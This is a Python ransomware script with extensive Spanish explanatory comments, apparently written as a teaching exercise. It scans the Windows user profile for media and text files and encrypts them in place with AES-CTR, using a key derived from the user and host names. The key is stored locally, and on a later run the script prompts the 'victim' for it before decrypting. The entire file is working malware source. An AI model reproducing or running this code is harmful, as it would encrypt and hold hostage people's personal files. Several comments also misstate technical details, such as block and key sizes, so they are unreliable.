#!/usr/bin/python
#-*-coding:utf-*-

import os #maneja configuracion del sistema operativo
import socket# maneja paquetes de internet
import random # genera miles de millones de llaves de forma aleatoria
import hashlib # nos permite crear una llave
from Crypto.Util import Counter
from Crypto.Cipher import AES




perfil = os.environ['USERPROFILE'] # entorno de usuario principal
directorios = os.listdir(perfil)#aqui pasamos todos los directorios de home a la variable directorios
directorios = [x for x in directorios if not x.startswith('.')]# clase de la libreria os que diferencia parametros en los directorios. areglo que filtra todos los directorios y archivos que iniciaen con un punto
print(directorios)

ext = ['.mp3','.mp4','.jpeg','.jpg','.txt']#arreglo que contiene extenciones de archivos que vamos a encriptar

def crear_llave(): 
    llavepc = os.environ['USERPROFILE'] + os.environ['USERNAME'] + socket.gethostname() + str(random.randint(0,10000000000000000000000000)) # de esta forma le estamos dando la llave al home del usaurio principal, sumamos el usuario principal, pero ademas le damos el host
    #pasamos un numero random y como lo estamos concatenando, tendremos que convertir ese numero a string, con el fin de que la llave sea indecifrable. como todos sabemos que el host y usuario y la maquina son diferentes, con este ramdom ponenemos mas dificil la tarea de un algoritmo.
    llavepc = hashlib.sha512(llavepc.encode('utf-8')) # se encripta la cadena de texto de esta forma, sinembargo seria ilegible
    llavepc = llavepc.hexdigest() # se hace legible pasando a hexadecimal con esta orden.
    print(llavepc)
    nueva_llavepc = [] # creamos un areglo que esta vacio, porque esperamos que se llene con el string nuevo de 32 caracteres
    for t in llavepc: # se inicia un ciclo for, este ciclo lee la primera letra almacenada en llavepc y la copia a la variable t, que es una variable de paso
        if len(nueva_llavepc) == 32: # para saber si la nueva llave tiene las 32 silabas hacemos una comparacion. (len) palabra claave que cuenta la longitud de un string o cadena de t, para la variable t asignamos la primera letra de llavepc a continuacion, si la longitud de la palabra dentro de nueva llavepc es igual a 32 detiene el ciclo for, pero como tiene 0 caracteres sigue
            llavepc = "".join(nueva_llavepc) #join une caracteres, significa que cuando esten los 32 bits el valor de nueva_llavepc se copia a llavepc
            break
        else: # como aun no estan los 32 bits el for toma el conado else
            nueva_llavepc.append(t) #comando .append suma la palabra guardada en la leta "t" a la variable nueva_llavepc, ahora ya tiene guardado dentro su areglo la primera palabra a la variable neva_llavepc
    print(llavepc)
    return llavepc # nos devuelve el resultado almacenado en llavepc que tendra las 32 letras


def encriptar_desencriptar(archivo,modo,tamano=16): # se pasan tres parametros archivo esta variable toma el rachivo limpio sin encriptar y lo encripta o al contrario, el segundo parametro es modo el cual dira encriptar y desencriptar a su vez esta variable es funcion por que nos dira que hacer con el archivo, el tecer parametro sera tamano=16bits.
    with open(archivo,'r+b') as archivocript: #haga un bucle with con la variable archivo abriendolo en modo lectura y escritura binaria, y copie el resultado en la variable archivocript que es el ojeto nuevo.
        archivo_limpio = archivocript.read(tamano) # abra el archivocript en modo lectura y leea el tamaño de 16 bits y copie el valor a archivo_limpio, una vez ejecutada esta linea archivo_limpio tendra el primer codigo de 16 bits, ahora hay que encriptarlo
        while archivo_limpio: # cada vez que llegue un bloque nuevo lo encripte separadamente, hasta que finalice para no machacar los bloques, uno encima de otros
            archivo_encriptado = modo(archivo_limpio) # funcion modo, tome el bloque de 16bits que se encuentran dentro de archivo limpio y lo (encripta o desencripta dependiendo de otros parametros), una vez realizada la tarea copie ya (encriptado o desencriptado a archivo_encriptado)
            if len(archivo_limpio) != len(archivo_encriptado): # compare la longitud de archivo_limpio con la longitud de archivo_encriptado, Si NO son iguales mande un error igual a una cadena vacia
                raise ValueError('')
            archivocript.seek(-len(archivo_limpio),1) #con archivocript, busque hacia atras dentro de archivo limpio y corra un bloque para proceder a escribir
            archivocript.write(archivo_encriptado) # ahora se procede a escribir los bloques encriptados, escriba el nuevo bloque encriptado o desencriptado en archivo_encriptado
            archivo_limpio = archivocript.read(tamano) # leea de nuevo el bloque de 16bits, en archivo_limpio para que reinicie el bucle y siga encriptando y desencriptando
    
            
    

def encontrar(llave):#funcion encargada de buscar los archivos con extenciones uno por uno y lo almacene en un archivo, que no tendra extencion
    lista_encontrado = open('lista_encontrado','w+')#lo primero que hara esta funcion sera crear el archivo, pero si esta lo sobreescriba, y si no esta lo cree
    for directorio in directorios:#se declara una variable directorio en un ciclo for, que ira almacenando uno a uno cada directorio que encuentre en directorios(variable ya definida arriba)
        path = perfil+'/'+directorio #creamos otra variable llamada path que tendra, no solo los directorios, sino que toda la ruta de home
        for ext1 in ext: #se declara una variable ext1 que contendra todas las extenciones encontradas, el cual recorera todas las extenciones encontradas el cual se las aplicamos a los directorios
            for path1,carpeta,archivo in os.walk(path): # os.walk(path) realiza la funcion de selecionar unicamente los archivos que contienen esas extenciones
                for file in archivo: #creamos varible file del tipo ojeto de archivo
                    if file.endswith(ext1): #si el archivo tiene extencion igual a las escojidas guardarlas en el archivo, de lo contrario no.
                        lista_encontrado.write(os.path.join(path1,file)+'\n')# se le indica al sistema que cada escritura de archivo encontrado de un salto de linea y escriba lo siguinte. os.path.join es el encargado de unir cada archivo encontrado al lista_encontrado
    
    
    lista_encontrado.close() # cierra el archivo
    #archivo_llave = open('archivo_llave','w+') #creamos el archivo y lo abrimos en modo lectura
    #archivo_llave.write(llave) #le pasamos la llave y la copiamos al archivo_llave. esta llave se crea en la funcion crear llave, y esta llave la pamos como parametro en la funcion encontrar(llave)
    #archivo_llave.close()# cierra el archivo
    
    lista = open('lista_encontrado','r') #aqui creamos un objeto llamado lista para abrir el archivo lista_encontrado en modo lectura.
    lista = lista.read().split('\n') # lee un salto de linea
    lista = [l for l in lista if not l ==""] # lee si hay un espacio vacio en la lista de archivos. SI ES ASI NO LO TOME EN CUENTA
    
    
    if os.path.exists('archivo_llave'): # si el path del archivo_llave existe ejecute la siguiente linea, el caul es la peticion a la victima que introdusca la clave de 32 digitos
        llave1 = input('Introdusca la llave: ') #variable introducida por el usuario, y que lo compararemos con el original, archivo_llave = open('archivo_llave','w+')
        archivo_llave = open('archivo_llave','r') # abrimos el archivo original en modo lectura
        llave = archivo_llave.read().split('\n') # raliza la lectura le llave, y salta de linea
        llave ="".join(llave)
        
        if llave1 == llave: # si la llave1 es igual a la llave creada por nosotros, se realiza la desencriptacion
            c = Counter.new(128) # ponemos contador de bits a 128
            crypto = AES.new(llave.encode('utf-8'),AES.MODE_CTR,counter=c) # usamos AES de libreria crypto
            
            encriptararchivos = crypto.decrypt #por medio de esta asignacion decimos que vamos a desencriptar, se usa la funcioncrypto.decrypt que desencripta
            for element in lista:
                encriptar_desencriptar(element,encriptararchivos) # cada uno de los archivos lo pasamos por la funcion encriptar_desencriptar, element representa los archivos, y encriptararchivos representa el modo que en este caso es desencriptar
    else: # si no esta creada la llave el else lo envia a la seccion de enciptacion, creara primero la llave y luego encriptara
        c = Counter.new(128)
        crypto = AES.new(llave.encode('utf-8'),AES.MODE_CTR,counter=c)
        
        archivo_llave = open('archivo_llave','w+') # crea el archivo_llave y pegamos la llave alli. deesta forma el archivo no se creara antes de la conparacion
        archivo_llave.write(llave)
        archivo_llave.close()
        #si la llave existe no entrara al else e ira a pedir la clave de la llave a la victima
        encriptararchivos = crypto.encrypt
        for element in lista:
            encriptar_desencriptar(element,encriptararchivos)
        
        
    
            
        
def test_internet(): #funcion que verifica el acceso a internet
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#objeto s que abquiere las propiedades de socket.Con esto le decimos que vamos a crear un socket tipo TCP
    s.settimeout(8)#tiempo de coneccion de 8 segundos
    try:
        s.connect(('socket.io',80))#por medio la libreria io, averiguar con socket.io si hay connecion de internet por el puerto 80
        print("Conectado") # si hay coneccion a internet dira conectado
        s.close()
    except: # si no hay internet, de lo contrario sale
        exit()
    



def main():
    test_internet()
    llave = crear_llave()
    encontrar(llave) # crear_llave crea la llave, y retorna  una llave de 32digitos, que a la vez pasa como parametro a la funcion encontrar(llave) y lo guarda en un archivo
      
if __name__ == "__main__":   
    try:
        main() # si no hay errores ingresa a la funcion main
    except KeyboardInterrupt: # si hay un error, con la siguiente orden con solo tocar una letra sale, y no se queda congelado
        exit()
